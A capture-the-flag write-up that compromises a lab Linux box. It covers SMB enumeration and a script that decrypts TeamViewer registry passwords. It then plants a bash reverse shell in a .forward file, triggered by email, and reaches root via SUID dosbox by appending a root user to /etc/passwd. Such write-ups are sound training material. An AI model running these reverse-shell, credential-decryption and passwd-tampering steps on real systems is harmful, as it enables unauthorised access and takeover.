# Forward

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.157
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 13:51 +08
Nmap scan report for 192.168.157.157
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
25/tcp    open     smtp
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-d
```

We might need to exploit SMTP to 'forward' messages.&#x20;

### SMB Shares --> Teamviewer Creds

There's one share readable with NULL credentials.

```
$ smbmap -H 192.168.157.157                             
[+] IP: 192.168.157.157:445     Name: 192.168.157.157                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        utils                                                   READ ONLY       Utilities
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

Within it, there were some files present:

```
$ smbclient -N //192.168.157.157/utils
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Dec 18 16:26:48 2020
  ..                                  D        0  Fri Dec 18 15:48:44 2020
  fox.reg                             N    10634  Fri Dec 18 15:48:44 2020
  TeamViewer_Setup_v7.exe             N  5024832  Fri Dec 18 15:48:44 2020
  mara.reg                            N    10408  Fri Dec 18 15:48:44 2020
  vale.reg                            N    10206  Fri Dec 18 15:48:44 2020
  golemitratigunda.reg                N    10206  Fri Dec 18 15:48:44 2020
  alberobello.reg                     N    10206  Fri Dec 18 15:48:44 2020
  giammy.reg                          N    10312  Fri Dec 18 15:48:44 2020
  README.all                          N      165  Fri Dec 18 15:53:55 2020
```

We can download all of these files to our machine.

```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

We can first view the `README.all`:

```
$ cat README.all            
each of you has to install TeamViewer and then import your own registry key for automatic configuration.
Don't worry about the password, it's well encrypted!

Root!
```

TeamViewer credentials can actually be decrypted.&#x20;

{% embed url="https://whynotsecurity.com/blog/teamviewer/" %}

We can use parts of the script above to decrypt our files:

```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "1afa05622365454bf8b43255ac75ac87a60b9ad7ecc3ca9c2f856496cb8881ce"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)
    
print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

Each of the `.reg` files have this hex string within it:

```
"SecurityPasswordAES"=hex:b2,21,47,c7,58,c4,f3,9a,6d,bc,84,44,f2,45,58,c2,cf,\
  b5,44,a5,3b,94,74,a0,a2,d0,ea,21,b1,e1,3c,09
```

We can decrypt each password and test it with both `ssh` and SMB. I extracted each of the passowrds like this:

```
$ echo '2c,0f,ff,76,ca,03,d7,c2,1c,0d,3c,8b,55,ed,d8,de,37,\
  f8,97,20,ae,6e,d3,82,d0,ad,2e,70,f9,7e,ff,ea,0b,0c,1c,d9,01,cb,d1,ad,90,fc,\
  60,1b,9e,40,fc,9c,4b,af,65,ee,c5,19,62,eb,4e,da,cc,7c,30,a8,a6,6b,0c,bd,9f,\
  36,2a,c0,ca,d1,59,89,04,ae,cb,8b,96,10' | tr -d ',' | tr -d '\\' | tr -d '\n' | tr -d ' '
2c0fff76ca03d7c21c0d3c8b55edd8de37f89720ae6ed382d0ad2e70f97effea0b0c1cd901cbd1ad90fc601b9e40fc9c4baf65eec51962eb4edacc7c30a8a66b0cbd9f362ac0cad1598904aecb8b9610
```

Then, decrypted them using the script:

```
$ python3 decrypt.py        
00000000: 69 00 70 00 61 00 72 00  61 00 6C 00 69 00 70 00  i.p.a.r.a.l.i.p.
00000010: 6F 00 6D 00 65 00 6E 00  69 00 64 00 65 00 6C 00  o.m.e.n.i.d.e.l.
00000020: 6C 00 61 00 62 00 61 00  74 00 72 00 61 00 63 00  l.a.b.a.t.r.a.c.
00000030: 6F 00 6D 00 69 00 6F 00  6D 00 61 00 63 00 68 00  o.m.i.o.m.a.c.h.
00000040: 69 00 61 00 00 00 00 00  00 00 00 00 00 00 00 00  i.a.............
None
iparalipomenidellabatracomiomachia
```

The password above is for the user `fox`, and using those credentials grants us access to another SMB Share.

```
$ smbmap -H 192.168.157.157 -u fox -p iparalipomenidellabatracomiomachia
[+] IP: 192.168.157.157:445     Name: 192.168.157.157                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        utils                                                   READ ONLY       Utilities
        print$                                                  READ ONLY       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
        fox                                                     READ, WRITE     Home Directories
```

### New Shares --> Forward Shell

This `print$` share has some interesting stuff:

```
$ smbclient -U fox //192.168.157.157/print$                             
Password for [WORKGROUP\fox]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan  9 02:03:48 2021
  ..                                  D        0  Tue Jul  4 04:18:20 2023
  W32X86                              D        0  Sat Jan  9 02:03:48 2021
  IA64                                D        0  Mon Sep  2 21:39:42 2019
  x64                                 D        0  Sat Jan  9 02:03:48 2021
  COLOR                               D        0  Mon Sep  2 21:39:42 2019
  W32PPC                              D        0  Mon Sep  2 21:39:42 2019
  WIN40                               D        0  Mon Sep  2 21:39:42 2019
  W32MIPS                             D        0  Mon Sep  2 21:39:42 2019
  W32ALPHA                            D        0  Mon Sep  2 21:39:42 2019
  color                               D        0  Sat Jan  9 02:03:48 2021
```

But I couldn't make sense of any of those. Let's check the `fox` share next:

```
$ smbclient -U fox //192.168.157.157/fox   
Password for [WORKGROUP\fox]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 14:11:46 2023
  ..                                  D        0  Sat Jan  9 02:04:11 2021
  .bashrc                             H     3526  Fri Dec 18 15:48:44 2020
  .Xauthority                         H       53  Tue Aug 10 05:55:45 2021
  .bash_history                       H        0  Tue Jul  4 04:15:25 2023
  .profile                            H      807  Fri Dec 18 15:48:44 2020
  local.txt                           N       33  Fri Jul 14 13:51:10 2023
  .local                             DH        0  Tue Aug 24 18:20:56 2021
  .dosbox                            DH        0  Tue Aug 10 05:55:54 2021
  .bash_logout                        H      220  Fri Dec 18 15:48:44 2020
  .gnupg                             DH        0  Tue Aug 10 05:40:39 2021
  .forward                           AH       25  Tue Aug 24 18:23:05 2021
```

There's an interesting folder called `.forward` present.&#x20;

```
$ cat .forward                                                                 
 | /usr/bin/procmail -f-
```

I read more about this file here:

{% embed url="https://www.linux.com/news/process-your-email-procmail/" %}

Whenever the user receives mail, this output of the mail is piped to this binary. Since we have write access over the `fox` share, we can replace this with our own reverse shell.

```bash
 | bash -c 'bash -i >& /dev/tcp/192.168.45.227/80 0>&1'
```

Then, replace the `.forward` file in the share and send `fox@localhost` an email via `swaks`:

{% code overflow="wrap" %}
```
$ swaks --to fox@localhost --from test@localhost --header "Subject:Password Reset" --body "yo" --server 192.168.157.157
```
{% endcode %}

This would give us a reverse shell:

<figure><img src="../../../.gitbook/assets/image (2780).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### X11 Research + Fox Creds

Earlier I saw a `.dosbox` file within the `fox` share, so I checked whether it was an SUID binary:

```
fox@forward:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/dosbox
```

To exploit this, we need some form of GUI but RDP and VNC are both not available on this machine. Googling for 'SSH Dosbox Forwarding' brought up this Reddit post referring to x11:

{% embed url="https://www.reddit.com/r/dosbox/comments/72i07p/bad_input_over_ssh_x11_forwarding/" %}

Reading the manual for `ssh` reveals the `-X` flag is for x11 forwarding:

```
-X      Enables X11 forwarding.  This can also be specified on a
             per-host basis in a configuration file.

             X11 forwarding should be enabled with caution.  Users with
             the ability to bypass file permissions on the remote host
             (for the user's X authorization database) can access the
             local X11 display through the forwarded connection.  An
             attacker may then be able to perform activities such as
             keystroke monitoring.

             For this reason, X11 forwarding is subjected to X11
             SECURITY extension restrictions by default.  Refer to the
             ssh -Y option and the ForwardX11Trusted directive in
             ssh_config(5) for more information
```

In short, this allows us to spawn the GUI needed to exploit this. Dropping our SSH key doesn't work, so we need to find creds for `fox`.&#x20;

The `/home` directory had some other users, and one had a `.bash_history` folder:

```
fox@forward:/home$ ls
alberobello  fox  giammy  golemitratigunda  mara  vale
fox@forward:/home$ ls -la *
<TRUNCATED>
mara:
total 12
drwxr-xr-x 2 root root 4096 Dec 18  2020 .
drwxr-xr-x 8 root root 4096 Jan  8  2021 ..
-rw-r--r-- 1 root root   64 Dec 18  2020 .bash_history

fox@forward:/home/mara$ cat .bash_history 
sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191
```

This password works for `fox`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3455).png" alt=""><figcaption></figcaption></figure>

### Dosbox SUID --> Root

We can use the `-X` option after finding the user's password:

<figure><img src="../../../.gitbook/assets/image (1998).png" alt=""><figcaption></figcaption></figure>

I tested by running `dosbox`, which spawns the GUI for me:

<figure><img src="../../../.gitbook/assets/image (3735).png" alt=""><figcaption></figcaption></figure>

We can then run this:

```bash
dosbox -c 'mount c /' -c "type c:$LFILE"
```

This would mount the Linux file system within the C Drive of the termnal:

<figure><img src="../../../.gitbook/assets/image (3734).png" alt=""><figcaption></figcaption></figure>

To exploit this, first create a new hash:

```bash
$ openssl passwd -1 hello123                                
$1$rM9ydZhO$eC.2jbrxk2jETm6W64L/i1
```

Then, run these commands on a `fox` SSH session:

```bash
cp /etc/passwd easy
echo 'hacker:$1$rM9ydZhO$eC.2jbrxk2jETm6W64L/i1:0:0::/root:/bin.sh' >> easy
```

Then, on the `dosbox` instance, run this:

```bash
type C:/home/fox/easy >> C:/etc/passwd
```

We can then `ssh` in using the new `hacker` user:

<figure><img src="../../../.gitbook/assets/image (3201).png" alt=""><figcaption></figcaption></figure>
